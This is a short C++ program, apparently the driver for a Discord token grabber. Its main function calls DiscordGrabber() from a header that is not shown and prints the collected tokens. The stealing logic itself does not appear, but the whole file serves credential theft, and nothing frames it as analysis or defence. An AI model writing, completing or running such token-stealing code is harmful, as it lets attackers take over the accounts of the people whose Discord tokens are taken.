#include <exports.h>
#include <iostream>

int main() {


	auto tokens = DiscordGrabber();
	std::cout << "Grabbed Tokens: " << tokens << std::endl;

	std::cin.get();

	return 0;
}
